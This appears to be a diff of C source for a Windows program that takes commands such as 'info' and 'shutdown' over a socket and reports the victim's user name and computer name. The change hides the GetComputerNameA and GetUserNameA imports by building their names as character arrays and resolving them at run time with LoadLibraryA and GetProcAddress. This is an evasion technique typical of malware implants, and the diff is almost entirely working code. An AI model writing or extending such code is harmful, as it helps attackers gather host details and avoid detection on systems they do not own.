@@ -15,6 +15,7 @@ typedef int _WSACleanup();
 typedef int WSAAPI _WSAGetLastError();
 typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
 typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
+typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 
 #define SOCKET_BUFFER_SIZE 256
 #define UNLEN 256
@@ -147,17 +148,6 @@ WinMain(HINSTANCE hInstance,
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
 		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
-			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
-			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
-			if ( !libraryAdvapi32 )
-			{
-				OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
-				return 1;
-			}
-
-			char ca_GetUsernameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
-			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUsernameA);
-
 			char bufferError[256];
 			char bufferUser[UNLEN + 1];
 			DWORD len = sizeof(bufferUser);
@@ -165,13 +155,36 @@ WinMain(HINSTANCE hInstance,
 			char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
 			char bufferComputer[MAX_COMPUTERNAME_LENGTH + 1];
 			len = sizeof(bufferComputer);
-			if ( GetComputerNameA(bufferComputer, &len) <= 0 )
+
+			char ca_kernel32[256] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+			HMODULE libraryKernel32 = LoadLibraryA(ca_kernel32);
+			if ( !libraryKernel32 )
+			{
+				OutputDebugStringA("Loading libraryKernel32 failed.\n");
+				return 1;
+			}
+			
+			char ca_GetComputerNameA[] = { 'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0 };
+			_GetComputerNameA* f_GetComputerNameA = (_GetComputerNameA*)GetProcAddress(libraryKernel32, ca_GetComputerNameA);
+			
+			if ( f_GetComputerNameA(bufferComputer, &len) <= 0 )
 			{
 				sprintf(bufferError, "Could not get computer name: %ld\n", GetLastError());
 				OutputDebugStringA(bufferError);
 
 				strncpy(bufferComputer, ca_unknown, sizeof(ca_unknown));
 			}
+
+			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
+			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
+			if ( !libraryAdvapi32 )
+			{
+				OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
+				return 1;
+			}
+			
+			char ca_GetUserNameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
+			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);
 
 			if ( f_GetUserNameA(bufferUser, &len) <= 0 )
 			{
